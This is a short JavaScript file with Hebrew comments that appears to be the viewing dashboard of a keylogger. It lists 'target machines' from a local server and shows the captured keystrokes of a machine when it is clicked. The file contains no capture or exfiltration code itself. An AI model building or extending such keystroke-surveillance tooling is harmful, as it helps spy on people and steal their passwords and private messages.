async function loadComputers() {
    try {
        // שליחת בקשה לשרת לקבלת רשימת מחשבים
        let response = await fetch('http://localhost:5000/api/get_target_machines_list');
        let computers = await response.json();

        // איתור האלמנט הראשי שבו יוצגו המחשבים
        let mainDiv = document.getElementById('computers');

        // מעבר על רשימת המחשבים והצגת כל אחד מהם בדף
        computers.machines.forEach(computer => {
            let computerDiv = document.createElement('div');
            computerDiv.classList.add('window_computers');

            // יצירת רווחים לפני שם המחשב
            // computerDiv.appendChild(document.createElement('br'));
            // computerDiv.appendChild(document.createElement('br'));

            // יצירת אלמנט להצגת שם המחשב
            let computerName = document.createElement('h4');
            computerName.innerText = computer;
            computerDiv.appendChild(computerName);

            // הוספת אלמנט המחשב לתוך ה-DIV הראשי
            mainDiv.appendChild(computerDiv);

            // הוספת אירוע לחיצה על המחשב
            computerDiv.addEventListener('click', async function () {
                try {
                    // שליחת בקשה לקבלת נתוני ההקלדות של המחשב הנבחר
                    let response = await fetch(`http://localhost:5000/api/get_keystrokes/${computer}`);
                    let keystrokes = await response.json();

                    // קבלת המפתח הראשון של ההקלדות
                    let key = Object.keys(keystrokes)[0];

                    // עדכון התוכן של אלמנט ההקלדות בדף
                    let data = document.getElementById('data');
                    data.innerText = keystrokes[key];

                } catch (error) {
                    console.error("Error fetching keystrokes:", error);
                }
            });
        });
    } catch (err) {
        console.error("Error fetching computers:", err);
    }
}

// קריאה ראשונית לפונקציה לטעינת המחשבים
loadComputers();
